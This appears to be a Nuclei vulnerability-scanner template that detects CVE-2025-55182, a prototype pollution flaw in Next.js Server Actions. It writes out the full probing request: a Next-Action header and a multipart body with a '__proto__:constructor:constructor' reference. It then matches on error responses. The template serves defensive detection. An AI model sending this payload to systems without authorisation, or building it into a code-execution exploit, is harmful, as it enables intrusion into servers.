id: cve-2025-55182

info:
  name: Next.js Server Actions Prototype Pollution
  author: sickwell
  severity: high
  description: |
    Detection of Prototype Pollution vulnerability in Next.js Server Actions (CVE-2025-55182).
    The vulnerability allows an attacker to modify object prototypes through the Next-Action header
    and multipart form data, which can lead to arbitrary code execution on the server.
    The vulnerability occurs due to the lack of hasOwnProperty check when resolving references in React Flight Protocol.
  reference:
    - https://github.com/vercel/next.js
    - https://github.com/msanft/CVE-2025-55182
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
  classification:
    cve-id: CVE-2025-55182
    cwe-id: CWE-1321
  tags: nextjs,prototype-pollution,rce,server-actions,cve,cve2025

http:
  - method: POST
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/"
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15
      Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.9
      Accept-Encoding: gzip, deflate
      Connection: keep-alive
      Upgrade-Insecure-Requests: 1
    body: |
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="0"

      {"then":"$1:__proto__:constructor:constructor"}
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="1"

      {"x":1}
      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    matchers-condition: and
    matchers:
      # Required indicator: HTTP status 500
      - type: status
        status:
          - 500
      
      # Required indicator: Content-Type text/x-component
      - type: word
        part: header
        words:
          - "text/x-component"
      
      # Required indicator: presence of digest in response (React Flight Protocol error format)
      - type: regex
        part: body
        regex:
          - 'E\{"digest":"[0-9]+"\}'
          - '\{"digest":"[0-9]+"\}'
          - 'digest'

